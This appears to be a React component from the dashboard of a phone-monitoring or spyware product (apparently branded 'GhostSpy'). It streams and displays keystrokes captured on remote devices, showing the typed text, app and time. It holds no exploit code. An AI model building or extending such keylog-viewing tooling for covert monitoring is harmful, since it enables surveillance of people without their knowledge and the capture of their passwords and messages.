import React, { useState, useEffect } from "react";
import toast from "react-hot-toast";
import { useTranslation } from "react-i18next";
import { Typography, CardMedia, Box } from "@mui/material";

import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";
import Color from "src/theme/colors";
import { formatDate } from "../../utils/common";

const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const { onSocketMonitor } = useSocketFunctions();
  const { socket } = useSocket();

  const [changeLoading, setChangeLoading] = useState(false);
  const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);

  useEffect(() => {
    if (!device?.deviceId) return;

    setRecieveKeyLogs([]);
    let isMounted = true;

    const init = async () => {
      setChangeLoading(true);
      try {
        await onSocketMonitor(SocketIOPublicEvents.key_monitor, { deviceId: device.deviceId });

        const onKeyMonitorResponse = (data) => {
          if (isMounted && device?.deviceId === data.deviceId) {
            setRecieveKeyLogs((prevLogs) => {
              // Check if the data is already in the list to avoid duplicates
              const isDuplicate = prevLogs.some(
                (log) => log.created_at === data.created_at && log.keylogs === data.keylogs
              );

              if (!isDuplicate) {
                return [
                  ...prevLogs,
                  {
                    keyLogsType: data?.keyLogsType,
                    keylogs: data?.keylogs,
                    keyevent: data?.keyevent,
                    created_at: data?.created_at,
                  },
                ];
              }

              return prevLogs;
            });

            setChangeLoading(false);
          }
        };

        socket.on(`key-logs-shared-${device.deviceId}`, onKeyMonitorResponse);

        return () => {
          socket.off(`key-logs-shared-${device.deviceId}`, onKeyMonitorResponse);
          isMounted = false;
        };
      } catch (error) {
        toast.error(t("toast.error.server-error"), {
          position: "bottom-center",
          reverseOrder: false,
          duration: 5000,
          style: {
            backgroundColor: Color.background.red_gray01,
            borderRadius: "5px",
            padding: "3px 10px",
          },
        });
        setChangeLoading(false);
      }
    };

    init();
  }, [monitor]);

  const onCloseModal = () => {
    setRecieveKeyLogs([]);
    onClose(false);
  };

  return (
    <MonitorViewer
      initialState={{
        width: 700,
        height: 500,
        x: 50,
        y: -120,
        minWidth: 500,
        minHeight: 400,
        maxWidth: 700,
        maxHeight: 600,
      }}
      onClose={onCloseModal}
    >
      <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
        <Box
          sx={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            pt: 2,
            width: "100%",
            height: "100%",
          }}
        >
          <Box
            sx={{
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              width: "100%",
              height: "100%",
            }}
          >
            <Box
              sx={{
                display: "flex",
                justifyContent: "space-between",
                px: 3,
                backgroundColor: Color.background.purple,
                py: 1,
              }}
            >
              <Typography
                component="h2"
                sx={{ color: Color.text.primary, textAlign: "left", flex: "25%" }}
              >
                {t("devicesPage.monitors.keyevent")}
              </Typography>
              <Typography
                component="h2"
                sx={{
                  color: Color.text.primary,
                  textAlign: "center",
                  flex: "25%",
                  maxWidth: "180px",
                }}
              >
                {t("devicesPage.monitors.keypackage")}
              </Typography>
              <Typography
                component="h2"
                sx={{ color: Color.text.primary, textAlign: "right", flex: "25%" }}
              >
                {t("devicesPage.monitors.keylogs")}
              </Typography>
              <Typography
                component="h2"
                sx={{ color: Color.text.primary, textAlign: "right", flex: "25%" }}
              >
                {t("devicesPage.monitors.key-date")}
              </Typography>
            </Box>

            <Box
              sx={{
                backgroundColor: "black",
                border: `solid 1px ${Color.background.border}`,
                borderRadius: "5px",
                height: "500px",
                p: 1,
                overflowY: "auto",
              }}
            >
              {changeLoading ? (
                <Box
                  sx={{
                    position: "absolute",
                    top: 0,
                    left: 0,
                    right: 0,
                    bottom: 0,
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    zIndex: 1,
                    color: "white",
                  }}
                >
                  <CardMedia
                    component="img"
                    src="/assets/logos/spy/ghostspy-logo-_2_.webp"
                    sx={{ cursor: "default", width: "auto", height: "auto" }}
                  />
                </Box>
              ) : (
                recieveKeyLogs
                  .slice()
                  .reverse()
                  .map((item, index) => (
                    <Box
                      key={index}
                      sx={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                      }}
                    >
                      <Typography
                        sx={{ color: Color.text.primary, textAlign: "left", flex: "25%" }}
                      >
                        {item.keyevent}
                      </Typography>
                      <Typography
                        sx={{
                          color: Color.text.primary,
                          textAlign: "center",
                          flex: "20%",
                          maxWidth: "180px",
                          wordWrap: "break-word",
                        }}
                      >
                        {item.keyLogsType}
                      </Typography>
                      <Typography
                        sx={{
                          color: Color.text.primary,
                          textAlign: "right",
                          flex: "30%",
                          maxWidth: "180px",
                          wordWrap: "break-word",
                        }}
                      >
                        {item.keylogs}
                      </Typography>
                      <Typography
                        sx={{
                          fontSize: "14px",
                          color: Color.text.purple,
                          textAlign: "right",
                          flex: "25%",
                        }}
                      >
                        {formatDate(item.created_at)}
                      </Typography>
                    </Box>
                  ))
              )}
            </Box>
          </Box>
        </Box>
      </Box>
    </MonitorViewer>
  );
};

export default KeyLogsMonitorViewer;
